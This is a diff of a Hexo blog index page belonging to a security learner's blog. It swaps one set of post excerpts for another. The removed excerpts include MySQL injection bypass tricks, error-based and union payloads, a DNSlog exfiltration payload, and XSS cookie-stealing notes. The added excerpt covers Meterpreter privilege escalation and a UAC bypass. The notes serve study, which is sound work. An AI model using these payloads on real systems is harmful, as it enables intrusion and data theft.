@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta property="og:type" content="website">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/index.html">
+<meta property="og:url" content="http://example.com/page/2/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="R0ser1">
@@ -85,8 +85,6 @@
 
     <link rel="preload" href= "/css/style.css?v=20210204" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     <link rel="stylesheet" href= "/css/mobile.css?v=20210204" media="(max-width: 980px)">
-    
-    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -212,8 +210,10 @@
 <meta name="generator" content="Hexo 5.4.0"></head>
 
     
+        <body class="home-body">
     
-<header class="header">
+    
+<header class="header index-header">
 
     <!-- top read progress line -->
     <div class="header-element">
@@ -237,7 +237,7 @@
     
 </header>
     
-<footer class="footer-fixed">
+<footer class="footer-fixed index-footer-fixed">
 
     <!-- back to top button -->
     <div class="footer-fixed-element">
@@ -258,21 +258,34 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 文章页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(https://tva4.sinaimg.cn/large/00774lbQly1gsk7i2wcgfj31z40nztia.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
+            R0ser1's Blog
+            <!-- 文章页  -->
+            
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
+            
+            
+                一个热爱电子竞技的Web弱狗
+            
+            <!-- 文章页  -->
             
         </p>
         <!-- 文章页meta -->
@@ -384,363 +397,34 @@
     
     
     <article class="index-post">
-        <a class="abstract-title" href = "/2021/07/18/DedeCMS%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" >
+        <a class="abstract-title" href = "/2021/03/21/Meterpreter%E5%90%8E%E6%B8%97%E9%80%8F/" >
             
-                <span>DedeCMS历史版本代码审计学习</span>
+                <span>Meterpreter后渗透</span>
         </a>
         <div class="abstract-content">
-            DEDECMS历史版本代码审计学习
+            仅此记录自己的学习笔记罢了。持续更新本文章
 
+Msf后渗透测试阶段做什么
 
-学习代码审计，自己简单记录一下。如有错误望师傅斧正。
+-提权
+-信息收集
+-渗透内网
+-永久后门
 
-DedeCMS重装漏洞这里我们用的版本是20120430，版本查看/data/admin/ver.txt。
-一、首先这个漏洞的本质是 Apache的解析漏洞
-参考以下文章分析Apache与php的结合方式的不同造成的结果
-
-https://www.cnblogs.com/milantgh/p/5116955.htmlhttps://blog.csdn.net/nuanyangH/article/details/105694856
-
-我们就当默认存在解析漏洞。当我们安装成功DedeCMS之后会在...
+在meterpreter中首先要获取system账号权限-load priv -getsystem▪ priv_elevate_getsystem: Operation failed: Access is denied. //说明有UAC限制
+绕过UAC限制use exploit/windows/local/ask //就是需要请求ask同意我才能执行’ VNC去访问那种▪ set session▪ set filename
+此时session会多出来一个新的具有sy...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
             <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/07/18</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/07/17/Mysql%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E5%A4%87%E5%BF%98%E5%BD%95/" >
-            
-                <span>Mysql注入技巧备忘录</span>
-        </a>
-        <div class="abstract-content">
-            MYSQL一些技巧
-仅仅是作为自己备忘录，如果错误，敬请斧正。
-
-0)基础饶过123456781.大小写绕过2.双写绕过3.添加注释 &#x2F;*!*&#x2F; or &#x2F;*!小于mysql版本*&#x2F;5.宽字节、Latin1默认编码Latin1编码：[Mysql表的编码默认为latin1，如果设置字符集为utf8，则存在一些latin1中有而utf8中没有的字符，而Mysql是如何处理这些字符的呢？直接忽略。于是我们可以输入?username&#x3D;admin%c2，存储至表中就变为了admin上面的%c2可以换为%c2-%ef之间的任意字符]
-1)过滤空格
-反引...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/07/17</span>
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/03/21</span>
             </div>
             <!-- tags  -->
             
             <div class= abstract-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL注入">SQL注入</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/07/17/Tryhackme%E8%AE%B0%E5%BD%95liunx%E6%8F%90%E6%9D%83/" >
-            
-                <span>Tryhackme记录liunx提权</span>
-        </a>
-        <div class="abstract-content">
-            Tryhackme学习liunx提权
-
-
-LinEnum 是一个简单的 bash 脚本，它执行与权限提升相关的常见命令，从而节省时间并允许投入更多精力来获取 root 权限https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
-
-一、滥用SUIID/GUID文件查找和利用 SUID 文件
-
-Linux 提权利用的第一步是检查设置了 SUID/GUID 位的文件。这意味着可以使用文件所有者/组的权限运行一个或多个文件。在这种情况下，作为超级用户。我们可以利用它来获得具有这些权限的 shell！
-
- 什么是 SUID 二进制文...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/07/17</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/07/17/Volatility/" >
-            
-                <span>Volatility</span>
-        </a>
-        <div class="abstract-content">
-            #Volatility学习
-
-查看活动进程，我们还可以查看创建镜像时的活动网络连接！现在让我们使用命令 volatility -f MEMORY_FILE.raw --profile=PROFILE netscan 来执行此操作。
-
-
-恶意软件试图隐藏自身以及与之关联的进程是很常见的。话虽如此，我们可以通过命令 psxview 查看有意隐藏的进程
-
-
-除了通过 psxview 查看隐藏进程之外，我们还可以通过命令“ldrmodules”更加专注地检查这一点。这里中间会出现三列，InLoad、InInit、InMem。如果其中任何一个是错误的，则该模块可能已被注入，这是一件非常糟糕的事情。...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/07/17</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/07/17/PHPCMSV9%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" >
-            
-                <span>PHPCMSV9版本代码审计学习</span>
-        </a>
-        <div class="abstract-content">
-            学习代码审计，自己简单记录一下。如有错误望师傅斧正。
-PHPCMS预备知识PHPCMS是采用MVC设计模式开发,基于模块和操作的方式进行访问，采用单一入口模式进行项目部署和访问，无论访问任何一个模块或者功能，只有一个统一的入口。
-
-
-
-参数名称
-描述
-位置
-备注
-
-
-
-m
-模型/模块名称
-phpcms/modules中模块目录名称
-必须
-
-
-c
-控制器名称
-phpcms/modules/模块/*.php 文件名称
-必须
-
-
-a
-事件名称
-phpcms/modules/模块/*.php 中方法名称
-
-
-
-PHPCMSV9.2上传Getshell漏洞复现我们搭建好环境直接注册，找到修改头像。...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/07/17</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "代码审计">代码审计</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/05/17/Mysql-Join%E6%B3%A8%E5%85%A5/" >
-            
-                <span>Mysql_Join注入技巧</span>
-        </a>
-        <div class="abstract-content">
-            Join注入技巧join无名列报错注入约束条件
-
-在知到表名的前提下才能操作
-
-注入语句
-1and extractvalue(1,concat(0x7e,(select * from (select * from users join users b using(id))c),0x7e))
-
-依次枚举即可
-Join代替order by [过滤了逗号]payload
-1union select * from (select 1) a join (select 2) b join (select 3) c%23
-
-
-
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/05/17</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL注入">SQL注入</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/05/17/XSS%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/" >
-            
-                <span>XSS一些记录</span>
-        </a>
-        <div class="abstract-content">
-            XSS一些总结除了script以外大多标签自动加载触发JS代码大多用的都是on事件，以下标签都可以用下面的方法去打Cookie以及url等
-123456789101112131415161718192021常见标签&lt;img&gt;&lt;input&gt;&lt;details&gt;&lt;svg&gt;&lt;select&gt;&lt;iframe&gt;&lt;video&gt;&lt;audio&gt;&lt;textarea&gt;  &lt;body&gt;&lt;Style&gt;&lt;Media&gt;such as: 其他的标签自动触发百度一下就好了&lt;b...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/05/17</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "XSS">XSS</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/05/12/DNSlog%E6%B3%A8%E5%85%A5/" >
-            
-                <span>DNSlog注入</span>
-        </a>
-        <div class="abstract-content">
-            文章推荐:
-
-https://www.anquanke.com/post/id/98096
-https://www.cnblogs.com/-qing-/p/10623583.html
-
-推荐平台:
-
-http://www.dnslog.cn  //不需要登录账户注册 速度快一点 简单测试推荐
-http://admin.dnslog.link
-http://ceye.io
-
-
-payload:
-and if((select load_file(concat(‘//‘,(语句 limit 0,1),’.xxxx.dnslog.cn\aaa’))),1,1)–+
-
-BugscanTeam 项...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/05/12</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL注入">SQL注入</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/05/11/Mysql%E4%B8%80%E4%BA%9B%E5%A4%87%E5%BF%98%E5%BD%95/" >
-            
-                <span>Mysql注入一些备忘录</span>
-        </a>
-        <div class="abstract-content">
-             Mysql注入一些备忘录
-
-获取信息函数12345database() 获取当前数据库名user()     获取当前用户version()  获取当前版本@@datadir  数据库路径  反猜路径@@version_compile_os 操作系统 
-
-Union查询1234567891011121314查表union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;0x74657374(数据库名test的Hex) limit 0,1--+查字段union select 1,co...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/05/11</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL注入">SQL注入</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/05/03/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" >
-            
-                <span>CTF反序列字符串逃逸</span>
-        </a>
-        <div class="abstract-content">
-            刷了一下CTF反序列化的题，去年没有好好了解。又补了一次PHP，害太菜了。每天看看别人的博客真的可以鼓舞人。简单记录一下两道字符串逃逸问题
-推荐一个反序列化总结的很好的笔记https://www.cnblogs.com/wjrblogs/p/12800358.html
-123456789101112131415161718192021222324//变长 直接构造多个关键词，这样就能逃出几个字符&lt;?phperror_reporting(255);class A&#123;    public  $filename = __FILE__;    public  function __...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/05/03</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "meterpreter">meterpreter</a>
     
 </div>
             
@@ -750,11 +434,87 @@ Union查询1234567891011121314查表union select 1,table_name,3 from information
     <!-- paginator  -->
     
     <nav class="page-nav">
-        <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/">NEXT &gt;</a>
+        <a class="extend prev" rel="prev" href="/">&lt; PREV</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
     </nav>
     
 </main>
             <!-- profile -->
+            
+            <div class="profile">
+    <img class="profile-avatar" alt="avatar" src= https://tva2.sinaimg.cn/large/00774lbQly1gsk7gp4qw1j30qo0qojtw.jpg >
+    <div class="profile-name">R0ser1</div>
+    
+    <div class="profile-signature">
+        快即是慢,慢即是快.主要是太菜了..
+    </div>
+    
+    
+    <div class="profile-social">
+        
+    
+        
+            
+                <a href="mailto:R0ser1@foxmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    
+        <div class="friends">
+            <div>FRIENDS</div>
+            
+                
+            
+                
+            
+                
+            
+        </div>
+    
+    
+        <div class="about-me">
+            <a href = "/about" >ABOUT ME</a>
+        </div>
+    
+</div>
             
         </div>
         <footer class="footer footer-unloaded">
